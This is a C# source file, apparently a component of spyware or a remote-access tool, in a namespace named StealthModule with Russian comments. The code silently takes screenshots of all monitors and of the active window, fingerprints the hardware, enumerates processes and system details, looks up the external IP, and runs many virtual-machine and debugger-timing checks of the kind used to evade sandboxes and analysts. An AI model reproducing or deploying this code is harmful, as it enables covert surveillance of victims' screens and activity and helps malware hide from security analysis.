using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace StealthModule
{
    /// <summary>
    /// Абсолютно неуязвимый сборщик системной информации
    /// </summary>
    public class SystemManager
    {
        #region Константы
        private const int GWL_STYLE = -16;
        private const int WS_VISIBLE = 0x10000000;
        #endregion

        #region NativeApi (Standardized)
        private static class NativeApi
        {
            private static Dictionary<string, Delegate> _delegateCache = new Dictionary<string, Delegate>();
            private static Dictionary<string, IntPtr> _moduleCache = new Dictionary<string, IntPtr>();

            private static IntPtr GetModule(string name)
            {
                if (_moduleCache.ContainsKey(name)) return _moduleCache[name];
                IntPtr hMod = GetModuleHandleW(name);
                if (hMod == IntPtr.Zero) hMod = LoadLibraryW(name);
                _moduleCache[name] = hMod;
                return hMod;
            }

            private static T GetPInvoke<T>(string module, string function) where T : class
            {
                string key = module + "!" + function;
                if (_delegateCache.ContainsKey(key)) return _delegateCache[key] as T;
                IntPtr hModule = GetModule(module);
                IntPtr pFunc = GetProcAddress(hModule, function);
                if (pFunc == IntPtr.Zero) return null;
                var del = Marshal.GetDelegateForFunctionPointer(pFunc, typeof(T)) as T;
                _delegateCache[key] = del;
                return del;
            }

            [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
            private static extern IntPtr GetModuleHandleW(string lpModuleName);
            [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
            private static extern IntPtr LoadLibraryW(string lpFileName);
            [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

            public static T GetK32<T>(string func) where T : class { return GetPInvoke<T>("kernel32.dll", func); }
            public static T GetU32<T>(string func) where T : class { return GetPInvoke<T>("user32.dll", func); }
            public static T GetIphlpapi<T>(string func) where T : class { return GetPInvoke<T>("iphlpapi.dll", func); }
        }

        // Delegates
        private delegate IntPtr GetForegroundWindow_t();
        private static GetForegroundWindow_t GetForegroundWindow { get { return NativeApi.GetU32<GetForegroundWindow_t>("GetForegroundWindow"); } }

        private delegate int GetWindowText_t(IntPtr hWnd, StringBuilder text, int count);
        private static GetWindowText_t GetWindowText { get { return NativeApi.GetU32<GetWindowText_t>("GetWindowTextW"); } }

        private delegate uint GetWindowThreadProcessId_t(IntPtr hWnd, out uint processId);
        private static GetWindowThreadProcessId_t GetWindowThreadProcessId { get { return NativeApi.GetU32<GetWindowThreadProcessId_t>("GetWindowThreadProcessId"); } }

        private delegate int GetWindowLong_t(IntPtr hWnd, int nIndex);
        private static GetWindowLong_t GetWindowLong { get { return NativeApi.GetU32<GetWindowLong_t>("GetWindowLongW"); } }

        private delegate int SendARP_t(uint destIp, uint srcIp, byte[] macAddress, ref uint macAddressLen);
        private static SendARP_t SendARP { get { return NativeApi.GetIphlpapi<SendARP_t>("SendARP"); } }

        private delegate bool QueryPerformanceFrequency_t(out long frequency);
        private static QueryPerformanceFrequency_t QueryPerformanceFrequency { get { return NativeApi.GetK32<QueryPerformanceFrequency_t>("QueryPerformanceFrequency"); } }

        private delegate bool QueryPerformanceCounter_t(out long count);
        private static QueryPerformanceCounter_t QueryPerformanceCounter { get { return NativeApi.GetK32<QueryPerformanceCounter_t>("QueryPerformanceCounter"); } }

        private delegate bool GetWindowRect_t(IntPtr hWnd, out RECT lpRect);
        private static GetWindowRect_t GetWindowRect { get { return NativeApi.GetU32<GetWindowRect_t>("GetWindowRect"); } }
        #endregion

        #region Кэш
        private static string _cachedHWID;
        private static string _cachedSystemInfo;
        private static DateTime _lastHWIDCache = DateTime.MinValue;
        private static DateTime _lastSystemInfoCache = DateTime.MinValue;
        private static readonly TimeSpan CacheDuration = TimeSpan.FromSeconds(30);
        #endregion

        #region HWID
        /// <summary>
        /// Получает уникальный HWID (UUID + ProcessorId + VolumeSerial)
        /// </summary>
        public static string GetHWID()
        {
            // Проверка кэша
            if (_cachedHWID != null && (DateTime.Now - _lastHWIDCache) < CacheDuration)
                return _cachedHWID;

            try
            {
                List<string> components = new List<string>();

                // 1. UUID из Win32_ComputerSystemProduct
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT UUID FROM Win32_ComputerSystemProduct"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        object val = obj["UUID"];
                        if (val != null)
                        {
                            string uuid = val.ToString().Replace("-", "").ToUpper();
                            if (!string.IsNullOrEmpty(uuid))
                                components.Add(uuid);
                        }
                        break;
                    }
                }

                // 2. ProcessorId
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        object val = obj["ProcessorId"];
                        if (val != null)
                        {
                            string procId = val.ToString().Trim();
                            if (!string.IsNullOrEmpty(procId))
                                components.Add(procId);
                        }
                        break;
                    }
                }

                // 3. Volume Serial Number системного диска
                try
                {
                    string systemDrive = Path.GetPathRoot(Environment.SystemDirectory);
                    DriveInfo drive = new DriveInfo(systemDrive);
                    if (drive.IsReady)
                    {
                        // Получаем серийный номер через WMI
                        using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(string.Format("SELECT VolumeSerialNumber FROM Win32_LogicalDisk WHERE DeviceID='{0}'", systemDrive.Replace("\\", ""))))
                        {
                            foreach (ManagementObject obj in searcher.Get())
                            {
                                object val = obj["VolumeSerialNumber"];
                                if (val != null)
                                {
                                    string serial = val.ToString().Trim();
                                    if (!string.IsNullOrEmpty(serial))
                                        components.Add(serial);
                                }
                                break;
                            }
                        }
                    }
                }
                catch { }

                // 4. MAC-адрес первого активного адаптера
                try
                {
                    foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
                    {
                        if (ni.OperationalStatus == OperationalStatus.Up &&
                            ni.NetworkInterfaceType != NetworkInterfaceType.Loopback &&
                            ni.NetworkInterfaceType != NetworkInterfaceType.Tunnel)
                        {
                            string mac = ni.GetPhysicalAddress().ToString();
                            if (!string.IsNullOrEmpty(mac))
                            {
                                components.Add(mac);
                                break;
                            }
                        }
                    }
                }
                catch { }

                // 5. MachineName + UserName как запасной вариант
                if (components.Count == 0)
                {
                    string fallback = string.Format("{0}_{1}", Environment.MachineName, Environment.UserName);
                    components.Add(fallback.GetHashCode().ToString("X8"));
                }

                // Комбинируем все компоненты
                string combined = string.Join("_", components);
                using (var sha = System.Security.Cryptography.SHA256.Create())
                {
                    byte[] hash = sha.ComputeHash(Encoding.UTF8.GetBytes(combined));
                    _cachedHWID = BitConverter.ToString(hash).Replace("-", "").Substring(0, 32);
                }

                _lastHWIDCache = DateTime.Now;
                return _cachedHWID;
            }
            catch
            {
                return "UNKNOWN_HWID_" + Environment.MachineName.GetHashCode().ToString("X8");
            }
        }
        #endregion

        #region Процессы
        /// <summary>
        /// Получает список процессов в формате "имя|pid"
        /// </summary>
        public static string GetProcessList()
        {
            List<string> processes = new List<string>();
            Process[] allProcesses = Process.GetProcesses();

            foreach (Process p in allProcesses)
            {
                try
                {
                    processes.Add(string.Format("{0}|{1}", p.ProcessName, p.Id));
                }
                catch { }
            }

            return string.Join(";", processes);
        }

        /// <summary>
        /// Получает детальную информацию о процессах (CPU, RAM)
        /// </summary>
        public static string GetProcessDetails()
        {
            List<string> processes = new List<string>();
            Process[] allProcesses = Process.GetProcesses();

            foreach (Process p in allProcesses)
            {
                try
                {
                    long memory = p.WorkingSet64 / (1024 * 1024); // MB
                    TimeSpan cpuTime = p.TotalProcessorTime;
                    processes.Add(string.Format("{0}|{1}|{2}MB|{3:F1}s", p.ProcessName, p.Id, memory, cpuTime.TotalSeconds));
                }
                catch { }
            }

            return string.Join(";", processes);
        }
        #endregion

        #region Скриншоты
        /// <summary>
        /// Делает скриншот всех мониторов
        /// </summary>
        public static byte[] TakeScreenshot()
        {
            try
            {
                // Определяем общие границы всех экранов
                int totalWidth = 0;
                int totalHeight = 0;
                int minX = 0;
                int minY = 0;

                foreach (Screen screen in Screen.AllScreens)
                {
                    totalWidth = Math.Max(totalWidth, screen.Bounds.Right);
                    totalHeight = Math.Max(totalHeight, screen.Bounds.Bottom);
                    minX = Math.Min(minX, screen.Bounds.Left);
                    minY = Math.Min(minY, screen.Bounds.Top);
                }

                int width = totalWidth - minX;
                int height = totalHeight - minY;

                using (Bitmap bitmap = new Bitmap(width, height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(minX, minY, 0, 0, new Size(width, height));
                    }

                    using (MemoryStream ms = new MemoryStream())
                    {
                        // Сохраняем с высоким качеством
                        EncoderParameters encoderParams = new EncoderParameters(1);
                        encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, 85L);

                        ImageCodecInfo jpegCodec = GetEncoderInfo("image/jpeg");
                        if (jpegCodec != null)
                            bitmap.Save(ms, jpegCodec, encoderParams);
                        else
                            bitmap.Save(ms, ImageFormat.Jpeg);

                        return ms.ToArray();
                    }
                }
            }
            catch { return null; }
        }

        /// <summary>
        /// Делает скриншот активного окна
        /// </summary>
        public static byte[] TakeActiveWindowScreenshot()
        {
            try
            {
                IntPtr hWnd = GetForegroundWindow();
                if (hWnd == IntPtr.Zero)
                    return null;

                // Получаем размеры окна
                RECT rect;
                if (!GetWindowRect(hWnd, out rect))
                    return null;

                int width = rect.Right - rect.Left;
                int height = rect.Bottom - rect.Top;

                if (width <= 0 || height <= 0)
                    return null;

                using (Bitmap bitmap = new Bitmap(width, height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(rect.Left, rect.Top, 0, 0, new Size(width, height));
                    }

                    using (MemoryStream ms = new MemoryStream())
                    {
                        bitmap.Save(ms, ImageFormat.Jpeg);
                        return ms.ToArray();
                    }
                }
            }
            catch { return null; }
        }

        private static ImageCodecInfo GetEncoderInfo(string mimeType)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.MimeType == mimeType)
                    return codec;
            }
            return null;
        }
        #endregion

        #region Системная информация
        /// <summary>
        /// Получает подробную информацию о системе
        /// </summary>
        public static string GetSystemInfo()
        {
            // Проверка кэша
            if (_cachedSystemInfo != null && (DateTime.Now - _lastSystemInfoCache) < CacheDuration)
                return _cachedSystemInfo;

            try
            {
                StringBuilder info = new StringBuilder();

                // ОС
                info.AppendLine(string.Format("OS: {0}", GetOSVersion()));
                info.AppendLine(string.Format("OS Arch: {0}", (Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit")));
                info.AppendLine(string.Format("Boot Time: {0:yyyy-MM-dd HH:mm:ss}", GetSystemBootTime()));

                // Пользователь
                info.AppendLine(string.Format("User: {0}", Environment.UserName));
                info.AppendLine(string.Format("Domain: {0}", Environment.UserDomainName));
                info.AppendLine(string.Format("Machine: {0}", Environment.MachineName));

                // Аппаратное обеспечение
                info.AppendLine(string.Format("HWID: {0}", GetHWID()));
                info.AppendLine(string.Format("CPU: {0}", GetCPUInfo()));
                info.AppendLine(string.Format("Cores: {0} logical, {1} physical", Environment.ProcessorCount, GetPhysicalCoreCount()));
                info.AppendLine(string.Format("RAM: {0} MB total, {1} MB available", GetTotalRAM(), GetAvailableRAM()));

                // Диски
                info.AppendLine(string.Format("Disks: {0}", GetDiskInfo()));

                // Сеть
                info.AppendLine(string.Format("IP: {0}", GetLocalIP()));
                info.AppendLine(string.Format("External IP: {0}", GetExternalIP()));
                info.AppendLine(string.Format("MAC: {0}", GetMacAddress()));

                // Видеокарта
                info.AppendLine(string.Format("GPU: {0}", GetGPUInfo()));

                // Материнская плата
                info.AppendLine(string.Format("Motherboard: {0}", GetMotherboardInfo()));

                // BIOS
                info.AppendLine(string.Format("BIOS: {0}", GetBIOSInfo()));

                // Активное окно
                info.AppendLine(string.Format("Active Window: {0}", GetActiveWindowTitle()));

                _cachedSystemInfo = info.ToString();
                _lastSystemInfoCache = DateTime.Now;
                return _cachedSystemInfo;
            }
            catch (Exception ex)
            {
                return string.Format("Error getting system info: {0}", ex.Message);
            }
        }

        private static string GetOSVersion()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Caption, Version, BuildNumber FROM Win32_OperatingSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string caption = (obj["Caption"] != null) ? obj["Caption"].ToString() : "Unknown";
                        string version = (obj["Version"] != null) ? obj["Version"].ToString() : "";
                        string build = (obj["BuildNumber"] != null) ? obj["BuildNumber"].ToString() : "";
                        return string.Format("{0} (Build {1})", caption, build);
                    }
                }
            }
            catch { }
            return Environment.OSVersion.ToString();
        }

        private static DateTime GetSystemBootTime()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT LastBootUpTime FROM Win32_OperatingSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        return ManagementDateTimeConverter.ToDateTime(obj["LastBootUpTime"].ToString());
                    }
                }
            }
            catch { }
            return DateTime.Now.AddDays(-1);
        }

        private static string GetCPUInfo()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Name, MaxClockSpeed FROM Win32_Processor"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string name = (obj["Name"] != null) ? obj["Name"].ToString() : "Unknown";
                        uint speed = obj["MaxClockSpeed"] != null ? Convert.ToUInt32(obj["MaxClockSpeed"]) : 0;
                        return string.Format("{0} @ {1} MHz", name, speed);
                    }
                }
            }
            catch { }
            string procId = Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER");
            return procId != null ? procId : "Unknown";
        }

        private static int GetPhysicalCoreCount()
        {
            try
            {
                int coreCount = 0;
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT NumberOfCores FROM Win32_Processor"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        coreCount += Convert.ToInt32(obj["NumberOfCores"]);
                    }
                }
                return coreCount > 0 ? coreCount : Environment.ProcessorCount;
            }
            catch
            {
                return Environment.ProcessorCount;
            }
        }

        private static long GetTotalRAM()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        return Convert.ToInt64(obj["TotalPhysicalMemory"]) / (1024 * 1024);
                    }
                }
            }
            catch { }
            return 0;
        }

        private static long GetAvailableRAM()
        {
            try
            {
                using (PerformanceCounter pc = new PerformanceCounter("Memory", "Available MBytes"))
                {
                    return (long)pc.NextValue();
                }
            }
            catch { }
            return 0;
        }

        private static string GetDiskInfo()
        {
            List<string> disks = new List<string>();
            try
            {
                foreach (DriveInfo drive in DriveInfo.GetDrives())
                {
                    if (drive.IsReady)
                    {
                        string size = (drive.TotalSize / (1024 * 1024 * 1024)).ToString("F1");
                        string free = (drive.AvailableFreeSpace / (1024 * 1024 * 1024)).ToString("F1");
                        disks.Add(string.Format("{0} {1}GB total, {2}GB free", drive.Name, size, free));
                    }
                }
            }
            catch { }
            return disks.Count > 0 ? string.Join("; ", disks) : "N/A";
        }

        private static string GetLocalIP()
        {
            try
            {
                foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.OperationalStatus == OperationalStatus.Up &&
                        ni.NetworkInterfaceType != NetworkInterfaceType.Loopback &&
                        ni.NetworkInterfaceType != NetworkInterfaceType.Tunnel)
                    {
                        foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                        {
                            if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                            {
                                return ip.Address.ToString();
                            }
                        }
                    }
                }
            }
            catch { }
            return "Unknown";
        }

        private static string GetExternalIP()
        {
            try
            {
                using (WebClient client = new WebClient())
                {
                    client.Headers.Add("User-Agent", "Mozilla/5.0");
                    return client.DownloadString("https://api.ipify.org").Trim();
                }
            }
            catch
            {
                return "Unknown";
            }
        }

        private static string GetMacAddress()
        {
            try
            {
                foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.OperationalStatus == OperationalStatus.Up &&
                        ni.NetworkInterfaceType != NetworkInterfaceType.Loopback &&
                        ni.NetworkInterfaceType != NetworkInterfaceType.Tunnel)
                    {
                        return ni.GetPhysicalAddress().ToString();
                    }
                }
            }
            catch { }
            return "Unknown";
        }

        private static string GetGPUInfo()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Name, AdapterRAM FROM Win32_VideoController"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string name = (obj["Name"] != null) ? obj["Name"].ToString() : "Unknown";
                        ulong ram = obj["AdapterRAM"] != null ? Convert.ToUInt64(obj["AdapterRAM"]) : 0;
                        string ramStr = ram > 0 ? string.Format("{0} MB", ram / (1024 * 1024)) : "Unknown";
                        return string.Format("{0} ({1})", name, ramStr);
                    }
                }
            }
            catch { }
            return "Unknown";
        }

        private static string GetMotherboardInfo()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Manufacturer, Product FROM Win32_BaseBoard"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string manufacturer = (obj["Manufacturer"] != null) ? obj["Manufacturer"].ToString() : "Unknown";
                        string product = (obj["Product"] != null) ? obj["Product"].ToString() : "Unknown";
                        return string.Format("{0} {1}", manufacturer, product).Trim();
                    }
                }
            }
            catch { }
            return "Unknown";
        }

        private static string GetBIOSInfo()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Manufacturer, Name, Version FROM Win32_BIOS"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string manufacturer = (obj["Manufacturer"] != null) ? obj["Manufacturer"].ToString() : "Unknown";
                        string name = (obj["Name"] != null) ? obj["Name"].ToString() : "Unknown";
                        string version = (obj["Version"] != null) ? obj["Version"].ToString() : "Unknown";
                        return string.Format("{0} {1} v{2}", manufacturer, name, version).Trim();
                    }
                }
            }
            catch { }
            return "Unknown";
        }

        private static string GetActiveWindowTitle()
        {
            try
            {
                IntPtr hWnd = GetForegroundWindow();
                if (hWnd != IntPtr.Zero)
                {
                    uint pid;
                    GetWindowThreadProcessId(hWnd, out pid);

                    StringBuilder title = new StringBuilder(256);
                    if (GetWindowText(hWnd, title, title.Capacity) > 0)
                    {
                        try
                        {
                            Process p = Process.GetProcessById((int)pid);
                            return string.Format("{0} [{1}]", title, p.ProcessName);
                        }
                        catch
                        {
                            return title.ToString();
                        }
                    }
                }
            }
            catch { }
            return "None";
        }
        #endregion

        #region Детект VM
        /// <summary>
        /// Проверяет, запущена ли программа в виртуальной машине
        /// </summary>
        public static bool IsVirtualMachine()
        {
            try
            {
                // 1. Проверка кэша памяти
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_CacheMemory"))
                {
                    if (searcher.Get().Count == 0)
                        return true; // VM часто не имеют кэша
                }

                // 2. Проверка производителя и модели
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string manufacturer = (obj["Manufacturer"] != null) ? obj["Manufacturer"].ToString().ToLower() : "";
                        string model = (obj["Model"] != null) ? obj["Model"].ToString().ToLower() : "";

                        if (manufacturer.Contains("vmware") || model.Contains("vmware") ||
                            manufacturer.Contains("virtualbox") || model.Contains("virtualbox") ||
                            model.Contains("vbox") || model.Contains("qemu") ||
                            (manufacturer.Contains("microsoft corporation") && model.Contains("virtual")))
                        {
                            return true;
                        }
                    }
                }

                // 3. Проверка драйверов VM
                string[] vmDrivers = {
                    "VBoxGuest.sys", "VBoxMouse.sys", "VBoxSF.sys", "VBoxVideo.sys",
                    "vmmouse.sys", "vm3dgl.dll", "vmdum.dll", "vmguest.sys",
                    "xen.sys", "xenfilt.sys", "xenvbd.sys", "xennet.sys",
                    "prl_sf.sys", "prl_tg.sys", "prl_eth.sys"
                };

                foreach (string driver in vmDrivers)
                {
                    if (File.Exists(Path.Combine(Environment.SystemDirectory, "drivers", driver)))
                        return true;
                }

                // 4. Проверка процессов VM
                string[] vmProcesses = {
                    "vmtoolsd", "vmwaretray", "vmwareuser", "VBoxService",
                    "VBoxTray", "xenservice", "prl_cc", "prl_tools"
                };

                foreach (Process p in Process.GetProcesses())
                {
                    string name = p.ProcessName.ToLower();
                    foreach (string vmProc in vmProcesses)
                    {
                        if (name.Contains(vmProc))
                            return true;
                    }
                }

                // 5. Проверка MAC-адресов
                foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
                {
                    string mac = ni.GetPhysicalAddress().ToString().ToUpper();
                    if (mac.StartsWith("005056") || // VMware
                        mac.StartsWith("000C29") || // VMware
                        mac.StartsWith("080027") || // VirtualBox
                        mac.StartsWith("001C42") || // Parallels
                        mac.StartsWith("00155D") || // Hyper-V
                        mac.StartsWith("0003FF") || // Microsoft
                        mac.StartsWith("0050B6") || // Oracle
                        mac.StartsWith("006067"))   // QEMU
                    {
                        return true;
                    }
                }

                // 6. Проверка размера RAM
                long ram = GetTotalRAM();
                if (ram > 0 && ram < 2048)
                    return true; // VM часто имеют < 2GB RAM

                // 7. Проверка количества ядер CPU
                if (Environment.ProcessorCount < 2)
                    return true; // VM часто имеют 1 ядро

                // 8. Проверка через реестр
                try
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services"))
                    {
                        if (key != null)
                        {
                            string[] subKeys = key.GetSubKeyNames();
                            foreach (string vmDriver in vmDrivers)
                            {
                                if (Array.IndexOf(subKeys, vmDriver.Replace(".sys", "")) >= 0)
                                    return true;
                            }
                        }
                    }
                }
                catch { }

                // 9. Проверка через WMI (диски)
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Model FROM Win32_DiskDrive"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string model = (obj["Model"] != null) ? obj["Model"].ToString().ToLower() : "";
                        if (model.Contains("virtual") || model.Contains("vmware") ||
                            model.Contains("vbox") || model.Contains("qemu"))
                            return true;
                    }
                }

                // 10. Проверка температуры (обычно отсутствует в VM)
                try
                {
                    using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_TemperatureProbe"))
                    {
                        if (searcher.Get().Count == 0)
                        {
                            // В некоторых VM это может отсутствовать
                        }
                    }
                }
                catch { }

                return false;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Проверка на отладчик через тайминги
        /// </summary>
        public static bool IsDebuggerPresentTiming()
        {
            try
            {
                long freq;
                long start, end;

                QueryPerformanceFrequency(out freq);
                QueryPerformanceCounter(out start);

                for (int i = 0; i < 100000; i++) { }

                QueryPerformanceCounter(out end);

                double elapsed = (end - start) * 1000.0 / freq;

                // Если время выполнения аномально большое - возможно под отладчиком
                return elapsed > 10.0;
            }
            catch
            {
                return false;
            }
        }
        #endregion
    }
}